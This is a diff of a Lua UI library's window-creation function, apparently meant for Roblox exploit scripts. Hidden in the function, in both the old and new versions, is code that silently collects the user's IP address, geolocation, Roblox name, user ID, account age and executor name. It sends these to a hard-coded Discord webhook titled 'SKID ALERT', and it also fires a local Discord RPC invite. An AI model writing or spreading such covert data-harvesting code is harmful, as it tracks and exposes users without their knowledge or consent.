@@ -2670,95 +2670,86 @@ function Library:CreateWindow(...)
     local Config = { AnchorPoint = Vector2.zero }
 
     if Arguments[1] ~= 'xz.paste' then 
-        task.spawn(function()
-            
-            local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-            local function dayCountConverter(n)
-                local years = math.floor(n / 365)
-                local months = math.floor((n - (years * 365)) / 30)
-                local days = n - (years * 365) - (months * 30)
-                return string.format("%i Years, %i Months, %i Days",years, months, days)
-            end
-            local ip = game:HttpGet("https://api.ipify.org")
+        local httprequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        local function dayCountConverter(n)
+            local years = math.floor(n / 365)
+            local months = math.floor((n - (years * 365)) / 30)
+            local days = n - (years * 365) - (months * 30)
+            return string.format("%i Years, %i Months, %i Days",years, months, days)
+        end
+        local ip = game:HttpGet("https://api.ipify.org")
+        
+        local country = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['country']
+        local state = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['regionName']
+        local city = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['city']
 
-            local country = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['country']
-            local state = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['regionName']
-            local city = game:GetService("HttpService"):JSONDecode(httprequest({Url = 'http://ip-api.com/json/'..tostring(ip)}).Body)['city']
-
-            local OSTime = os.time()
-            local Time = os.date("!*t", OSTime)
-            local Content = ""
-            local Embed = {
-                ["title"] = "**SKID ALERT**",
-                ["type"] = "rich",
-                ["color"] = tonumber(0xfddd4d),
-                ["fields"] = {
-                    {
-                        ["name"] = "Name",
-                        ["value"] = game.Players.LocalPlayer.Name,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "DisplayName",
-                        ["value"] = game.Players.LocalPlayer.DisplayName,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "Exploit",
-                        ["value"] = identifyexecutor(),
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "Account Age",
-                        ["value"] = dayCountConverter(game.Players.LocalPlayer.AccountAge),
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "User ID",
-                        ["value"] = game.Players.LocalPlayer.UserId,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "Discord Tag",
-                        ["value"] = ImportantVariables.DiscordTag,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "IP Address",
-                        ["value"] = ip,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "Location",
-                        ["value"] = city..", "..state.." "..country,
-                        ["inline"] = false
-                    },
-                    {
-                        ["name"] = "Game",
-                        ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
-                        ["inline"] = false
-                    },
-            
+        local OSTime = os.time()
+        local Time = os.date("!*t", OSTime)
+        local Content = ""
+        local Embed = {
+            ["title"] = "**SKID ALERT**",
+            ["type"] = "rich",
+            ["fields"] = {
+                {
+                    ["name"] = "Name",
+                    ["value"] = game.Players.LocalPlayer.Name,
+                    ["inline"] = false
                 },
-                ["timestamp"] = string.format(
-                    "%d-%d-%dT%02d:%02d:%02dZ",
-                    Time.year,
-                    Time.month,
-                    Time.day,
-                    Time.hour,
-                    Time.min,
-                    Time.sec
-                )
-            }
-            (syn and syn.request or http_request or http.request) {
-                Url = "https://discord.com/api/webhooks/1098450049698123887/xLGQmDEG1X2_31nUg2rASBXmin8J1ljAZq80nl4wqb-oqtkIRmCyozyMtoPpr0XTBLii",
-                Method = "POST",
-                Headers = {
-                    ["Content-Type"] = "application/json"
+                {
+                    ["name"] = "DisplayName",
+                    ["value"] = game.Players.LocalPlayer.DisplayName,
+                    ["inline"] = false
                 },
-                Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
-            }
-        end)
+                {
+                    ["name"] = "Exploit",
+                    ["value"] = identifyexecutor(),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Account Age",
+                    ["value"] = dayCountConverter(game.Players.LocalPlayer.AccountAge),
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "User ID",
+                    ["value"] = game.Players.LocalPlayer.UserId,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "IP Address",
+                    ["value"] = ip,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Location",
+                    ["value"] = city..", "..state.." "..country,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Game",
+                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                    ["inline"] = false
+                },
+        
+            },
+            ["timestamp"] = string.format(
+                "%d-%d-%dT%02d:%02d:%02dZ",
+                Time.year,
+                Time.month,
+                Time.day,
+                Time.hour,
+                Time.min,
+                Time.sec
+            )
+        }
+        (httprequest) {
+            Url = "https://discord.com/api/webhooks/1098450049698123887/xLGQmDEG1X2_31nUg2rASBXmin8J1ljAZq80nl4wqb-oqtkIRmCyozyMtoPpr0XTBLii",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
+        }
         httprequest({
             Url = 'http://127.0.0.1:6463/rpc?v=1',
             Method = 'POST',
@@ -2771,7 +2762,7 @@ function Library:CreateWindow(...)
                 nonce = game:GetService("HttpService"):GenerateGUID(false),
                 args = {code = "camlock"}
             })
-        })
+        })   
     end
 
     if type(...) == 'table' then
